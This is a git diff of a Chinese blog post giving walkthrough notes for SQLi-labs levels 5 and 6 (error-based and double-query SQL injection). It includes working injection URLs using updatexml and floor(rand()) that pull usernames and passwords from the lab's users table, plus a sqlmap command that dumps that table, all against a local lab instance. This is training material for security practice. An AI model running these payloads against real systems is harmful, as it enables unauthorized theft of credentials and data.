@@ -1,13 +1,14 @@
 ---
- title: Sqlilabs通关笔记(5-6)
+ title: Sqlilabs通关笔记(5-6)报错注入
  date: 2020-01-03 15:40:47
- tags:
+ tags: SQL注入
  categories:
 ---
 
 ## 第五关 基于GET单引号双注入
 ![2020-1-3-15-50-34-Sqlilabs通关笔记(4-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-15-50-34-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(4-10))
 
+<!--more-->
 ### 存在注入点判断
 
 1. 输入单引号测试，有报错信息，返回信息和第一关错误信息一样
@@ -94,7 +95,7 @@ $row = mysql_fetch_array($result);
     * 写法
 		> select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
     * 运用
-		>  http://localhost/sqlilabs2/Less-5/index.php?id=-1' and (updatexml(1,concat(0x7e,(select SUBSTRING(group_concat(username),12) from users),0x7e),1));--+
+		>  http://localhost/sqlilabs2/Less-5/index.php?id=-1' and (updatexml(1,concat(0x7e,(select SUBSTRING(group_concat(username),12) from users),0x7e),1))--+
 	![2020-1-3-17-17-6-Sqlilabs通关笔记(5-6)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-17-17-6-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(5-6))
     * 使用注意
 		- MySQL 5.1.5版本以上才支持该函数
@@ -150,11 +151,17 @@ $row = mysql_fetch_array($result);
     * 运用
     * 使用注意
 
+## 第六关 基于GET双引号双注入 
+和第五关类似，只要用双引号闭合即可
+> http://127.0.0.1/sqlilabs2/Less-6/index.php?id=-1" union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1))x from information_schema.tables group by x%23
+
+![2020-1-4-9-34-1-Sqlilabs通关笔记(5-6)报错注入](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-4-9-34-1-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(5-6)%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)
 
 ### SQLMAP注入
 
 直接上payload（第五六题均可用）
 ```
-sqlmap -u "http://127.0.0.1/sqlilabs2/Less-5/index.php?id=1" --technique E -D security -T users --dump
+sqlmap -u "http://127.0.0.1/sqlilabs2/Less-5/index.php?id=1" --technique E -D security -T users --dump --batch
 ```
+
 ![2020-1-3-17-23-39-Sqlilabs通关笔记(1-4)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-17-23-39-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-4))
